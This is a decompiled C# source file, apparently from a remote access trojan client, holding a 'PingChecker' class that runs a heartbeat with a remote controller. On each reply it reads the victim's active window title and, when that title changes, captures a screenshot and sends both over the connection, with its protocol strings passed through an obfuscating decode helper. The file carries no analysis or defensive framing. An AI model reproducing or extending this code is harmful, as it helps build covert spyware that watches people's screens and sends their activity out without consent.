using System;
using System.Threading;
using Leb128;

namespace Client.Helper
{
	// Token: 0x02000010 RID: 16
	public class PingChecker
	{
		// Token: 0x0600005E RID: 94 RVA: 0x000054C4 File Offset: 0x000036C4
		public PingChecker(Client client)
		{
			this.initializer = new Timer(new TimerCallback(this.Sender), client, 5000, 10000);
			this.pong = true;
		}

		// Token: 0x0600005F RID: 95 RVA: 0x000054F8 File Offset: 0x000036F8
		public void Start()
		{
			this.interval = 0;
			this.counter = new Timer(new TimerCallback(this.pay), null, 1, 1);
		}

		// Token: 0x06000060 RID: 96 RVA: 0x0000551C File Offset: 0x0000371C
		public void Stop(Client client)
		{
			if (this.counter != null)
			{
				this.counter.Dispose();
			}
			string activeWindowTitle = Methods.GetActiveWindowTitle();
			if (activeWindowTitle != this.oldtitle)
			{
				this.oldtitle = activeWindowTitle;
				client.Send(LEB128.Write(new object[]
				{
					EncryptString.Decode("Pong"),
					this.interval,
					activeWindowTitle,
					Methods.CaptureResizeReduceQuality()
				}));
			}
			else
			{
				client.Send(LEB128.Write(new object[]
				{
					EncryptString.Decode("Pong"),
					this.interval
				}));
			}
			this.pong = true;
		}

		// Token: 0x06000061 RID: 97 RVA: 0x000055D4 File Offset: 0x000037D4
		public void Disconnect()
		{
			if (this.counter != null)
			{
				this.counter.Dispose();
			}
			if (this.initializer != null)
			{
				this.initializer.Dispose();
			}
			this.pong = false;
		}

		// Token: 0x06000062 RID: 98 RVA: 0x0000560C File Offset: 0x0000380C
		private void Sender(object obj)
		{
			if (this.pong)
			{
				this.pong = false;
				((Client)obj).Send(LEB128.Write(new object[]
				{
					EncryptString.Decode("Ping")
				}));
				this.Start();
				GC.Collect();
			}
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00005660 File Offset: 0x00003860
		private void pay(object obj)
		{
			this.interval++;
		}

		// Token: 0x04000035 RID: 53
		private Timer counter;

		// Token: 0x04000036 RID: 54
		private Timer initializer;

		// Token: 0x04000037 RID: 55
		private int interval;

		// Token: 0x04000038 RID: 56
		private bool pong;

		// Token: 0x04000039 RID: 57
		private string oldtitle;
	}
}
